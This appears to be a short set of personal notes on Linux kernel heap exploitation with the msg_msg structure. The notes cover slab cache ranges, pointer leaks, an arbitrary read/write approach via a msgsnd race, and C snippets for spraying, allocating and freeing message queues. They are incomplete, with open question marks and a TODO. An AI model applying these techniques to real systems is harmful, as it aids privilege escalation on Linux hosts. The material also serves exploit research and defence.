* Info

@code c
struct msgmsg_256 {
  long mtype;
  char mtext[256 - 0x30];
} msgmsg_256;
msgmsg_256.mtype = 0x256;
@end

- page: `kmalloc-cg-32` to `kmalloc-cg-4k` (higher also can, may be directly served by mmap)
- heap leak: `fd` and `bk` pointers (very useful!)
- kbase leak: ?
- arb read/write: `msgmsg_seg` + race condition (overwrite `msgmsg_seg` during `msgsnd`, after it is initialized to 0)
- ROP: nil

Every `msg_msg` exists in a queue and can be of different sizes. The queue is doubly-linked and `msg_msg` can be freed
by `mtype` identifier.

Can use for cross-cache/transition between different cache sizes

** Arb read/write

@code c
static struct msg_msg *alloc_msg(size_t len)
{
	struct msg_msg *msg;
	struct msg_msgseg **pseg;
	size_t alen;

	alen = min(len, DATALEN_MSG);
	msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);
	if (msg == NULL)
		return NULL;

	msg->next = NULL;
	msg->security = NULL;

	len -= alen;
	pseg = &msg->next;
	while (len > 0) {
		struct msg_msgseg *seg;

		cond_resched();

		alen = min(len, DATALEN_SEG);
		seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);
		if (seg == NULL)
			goto out_err;
		*pseg = seg;
		seg->next = NULL;
		pseg = &seg->next;
		len -= alen;
	}

	return msg;

out_err:
	free_msg(msg);
	return NULL;
}
@end

Here, we see that `msg->next` is set to NULL (TODO what happens after)

* Interacting

Initialize queues for subsequent allocation and free

@code c
#include <sys/msg.h>
size_t msgs_spray = 0x5000;
size_t msg_queues[msgs_spray];
for (int i = 0; i < msgs_spray; i++) {
  msg_queues[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}
@end

*Allocation*
Note: Good idea to put the `idx` at the start of `mtext` so we can identify and free the correct queue `idx`
Note: size of `mtext` is `target_cache_size - 0x30`
Note: `size` parameter is `sizeof(msgmsg) - 8` for weird reasons

@code c
for (int i = 0; i < msgs_spray; i++) {
  msgsnd(msg_queues[i], &msgmsg_256, sizeof(msgmsg_256) - sizeof(long), 0);
}
@end

*Freeing*

@code c
msgrcv(msg_queues[vuln_idx], &msgmsg_256, sizeof(msgmsg_256) - sizeof(long), 0x256, 0);
@end
